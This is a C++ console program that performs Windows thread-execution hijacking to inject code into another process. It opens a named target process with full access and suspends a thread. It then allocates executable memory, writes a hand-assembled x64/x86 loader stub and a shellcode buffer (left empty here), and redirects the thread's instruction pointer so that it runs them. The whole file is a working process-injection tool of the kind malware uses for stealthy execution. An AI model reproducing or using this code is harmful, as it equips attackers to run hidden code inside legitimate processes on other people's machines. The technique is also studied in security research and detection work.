// ThreadExecutionHijack.cpp : Defines the entry point for the console application.
//

//http://www.rohitab.com/discuss/topic/40579-dll-injection-via-thread-hijacking/
//https://gist.github.com/CoolOppo/fa2b60f59eb5d748779a


#include "stdafx.h"
#include "general.h"
#include <psapi.h>
#include <stdio.h>
#include <Windows.h>

unsigned char scx64[] = "";
unsigned char scx86[] = "";

int wmain(int argc, wchar_t**argv) //to read in arguments as unicode
{
	if (argc != 2)
	{
		printf("Usage: threadexecutionhijack.exe [process name]\n");
		return -1;
	}

	//find the process ID by name
	DWORD pid = FindPIDByName(argv[1]);
	printf("[+] PID is: %d,0x%x\n", (UINT)pid, (UINT)pid);

	//open process with all access
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (hProcess == NULL)
	{
		ErrorExit(TEXT("OpenProcess"));
	}
	printf("[+] Process handle: 0x%Ix\n", (SIZE_T)hProcess);

	DWORD tid = FindThreadInPID(pid);

	//open thread
	HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, tid);
	if (!hThread)
	{
		ErrorExit(TEXT("OpenThread"));
	}
	printf("[+] Thread handle: 0x%Ix\r\n", (SIZE_T)hThread);

	LPCONTEXT lpContext = new CONTEXT();
	lpContext->ContextFlags = CONTEXT_FULL;

	if (SuspendThread(hThread) == -1)
	{
		ErrorExit(TEXT("SuspendThread"));
	}
	printf("[+] Thread suspended\r\n");

	if (!GetThreadContext(hThread, lpContext))
	{
		ErrorExit(TEXT("GetThreadContext"));
	}

	// put code here to check if a thread is in the middle of a system call or not

	//allocate memory in target process for shellcode
	LPVOID lpSCBaseAddress = (LPVOID)VirtualAllocEx(hProcess, NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (lpSCBaseAddress == NULL)
	{
		ErrorExit(TEXT("VirtualAllocEx"));
	}
	printf("[+] Allocated memory address in target process for shellcode: 0x%Ix\r\n", (SIZE_T)lpSCBaseAddress);

	//allocate memory in target process for loader
	LPVOID lpLoaderBaseAddress = (LPVOID)VirtualAllocEx(hProcess, NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (lpLoaderBaseAddress == NULL)
	{
		ErrorExit(TEXT("VirtualAllocEx"));
	}
	printf("[+] Allocated memory address in target process for loader: 0x%Ix\r\n", (SIZE_T)lpLoaderBaseAddress);

	DWORD size = 0, loader_size=0;
#ifdef _WIN64
	LPVOID sc = scx64;
	size = sizeof(scx64);
	loader_size = 104;
	lpContext->Rsp -= 8; // Allocate space on stack for the return address
	if (!WriteProcessMemory(hProcess, (PVOID)lpContext->Rsp, &lpContext->Rip, sizeof(SIZE_T), NULL)) // Write orginal eip into target thread's stack
	{
		ErrorExit(TEXT("WriteProcessMemory"));
	}
	lpContext->Rip = (SIZE_T)lpLoaderBaseAddress;

	/*
	0:  9c                      pushf
	1:  50                      push   rax
	2:  51                      push   rcx
	3:  52                      push   rdx
	4:  53                      push   rbx
	5:  55                      push   rbp
	6:  56                      push   rsi
	7:  57                      push   rdi
	8:  41 50                   push   r8
	a:  41 51                   push   r9
	c:  41 52                   push   r10
	e:  41 53                   push   r11
	10: 41 54                   push   r12
	12: 41 55                   push   r13
	14: 41 56                   push   r14
	16: 41 57                   push   r15
	18: 48 83 ec 28             sub    rsp,0x28
	1c: 48 c7 c1 00 00 00 00    mov    rcx,0x0
	23: 48 c7 c2 00 00 00 00    mov    rdx,0x0
	2a: 49 b8 88 77 66 55 44    movabs r8,0x1122334455667788
	31: 33 22 11
	34: 49 c7 c1 00 00 00 00    mov    r9,0x0
	3b: 6a 00                   push   0x0
	3d: 6a 00                   push   0x0
	3f: 48 a1 88 77 66 55 44    movabs rax,ds:0x1122334455667788
	46: 33 22 11
	49: ff d0                   call   rax
	4b: 48 83 c4 38             add    rsp,0x38
	4f: 41 5f                   pop    r15
	51: 41 5e                   pop    r14
	53: 41 5d                   pop    r13
	55: 41 5c                   pop    r12
	57: 41 5b                   pop    r11
	59: 41 5a                   pop    r10
	5b: 41 59                   pop    r9
	5d: 41 58                   pop    r8
	5f: 5f                      pop    rdi
	60: 5e                      pop    rsi
	61: 5d                      pop    rbp
	62: 5b                      pop    rbx
	63: 5a                      pop    rdx
	64: 59                      pop    rcx
	65: 58                      pop    rax
	66: 9d                      popf
	67: c3                      ret

	*/
	unsigned char loader[] = "\x9C\x50\x51\x52\x53\x55\x56\x57\x41\x50\x41\x51\x41\x52\x41\x53\x41\x54\x41\x55\x41\x56\x41\x57\x48\x83\xEC\x28\x48\xC7\xC1\x00\x00\x00\x00\x48\xC7\xC2\x00\x00\x00\x00\x49\xB8\x88\x77\x66\x55\x44\x33\x22\x11\x49\xC7\xC1\x00\x00\x00\x00\x6A\x00\x6A\x00\x48\xA1\x88\x77\x66\x55\x44\x33\x22\x11\xFF\xD0\x48\x83\xC4\x38\x41\x5F\x41\x5E\x41\x5D\x41\x5C\x41\x5B\x41\x5A\x41\x59\x41\x58\x5F\x5E\x5D\x5B\x5A\x59\x58\x9D\xC3";

	LPVOID CreateThread_Address = CreateThread;
	printf("[i] CreateThread address: 0x%Ix\r\n", (SIZE_T)CreateThread_Address);

	PutDwordIntoCharX64((SIZE_T)lpSCBaseAddress, loader, 44);
	PutDwordIntoCharX64((SIZE_T)lpLoaderBaseAddress + 200, loader, 65);

	printf("[+] Loader shellcode:");
	for (size_t i = 0; i != loader_size; i++) {
		printf("\\x%02x", (unsigned char)loader[i]);
	}
	printf("\r\n");


#endif

#ifdef _X86_
	LPVOID sc = scx86;
	size = sizeof(scx86);
	loader_size = 26;
	lpContext->Esp -= 4; // Allocate space on stack for the return address
	if (!WriteProcessMemory(hProcess, (PVOID)lpContext->Esp, &lpContext->Eip, sizeof(PVOID), NULL)) // Write orginal eip into target thread's stack
	{
		ErrorExit(TEXT("WriteProcessMemory"));
	}
	lpContext->Eip = (SIZE_T)lpLoaderBaseAddress;
	/*
	0:  60                      pusha
	1:  9c                      pushf
	2:  6a 00                   push   0x0
	4:  6a 00                   push   0x0
	6:  6a 00                   push   0x0
	8:  68 44 55 66 77          push   0x77665544 //address of SC
	d:  6a 00                   push   0x0
	f:  6a 00                   push   0x0
	11: ff 15 44 33 22 11       call   DWORD PTR ds:0x11223344 // memory address where CreateThread address is stored
	17: 9d                      popf
	18: 61                      popa
	19: c3                      ret
	*/
	unsigned char loader[] = "\x60\x9C\x6A\x00\x6A\x00\x6A\x00\x68\x44\x55\x66\x77\x6A\x00\x6A\x00\xFF\x15\x44\x33\x22\x11\x9D\x61\xC3";

	LPVOID CreateThread_Address = CreateThread;
	printf("[i] CreateThread address: 0x%Ix\r\n", (SIZE_T)CreateThread_Address);

	PutDwordIntoCharX86((SIZE_T)lpSCBaseAddress, loader, 9);
	PutDwordIntoCharX86((SIZE_T)lpLoaderBaseAddress + 200, loader, 19);

	printf("[+] Loader shellcode:");
	for (size_t i = 0; i != loader_size; i++) {
		printf("\\x%02x", (unsigned char)loader[i]);
	}
	printf("\r\n");
#endif


	// write shellcode to target process
	if (!WriteProcessMemory(hProcess, lpSCBaseAddress, sc, size, NULL))
	{
		ErrorExit(TEXT("WriteProcessMemory"));
	}
	printf("[+] Wrote shellcode to the target process\r\n");

	// write loader to target process
	if (!WriteProcessMemory(hProcess, lpLoaderBaseAddress, loader, loader_size, NULL))
	{
		ErrorExit(TEXT("WriteProcessMemory"));
	}
	printf("[+] Wrote loader to the target process\r\n");

	// write CreateThread_Address to target process
	if (!WriteProcessMemory(hProcess, (LPVOID)((SIZE_T)lpLoaderBaseAddress + 200), &CreateThread_Address, sizeof(SIZE_T), NULL))
	{
		ErrorExit(TEXT("WriteProcessMemory"));
	}
	printf("[+] Wrote CreateThread_Address to the target process\r\n");

	system("pause");

	//update threat context
	if (!SetThreadContext(hThread, lpContext))
	{
		ErrorExit(TEXT("SetThreadContext"));
	}
	printf("[+] Thread context updated\r\n");

	if (!ResumeThread(hThread))
	{
		ErrorExit(TEXT("ResumeThread"));
	}
	printf("[+] Thread resumed\r\n");

}
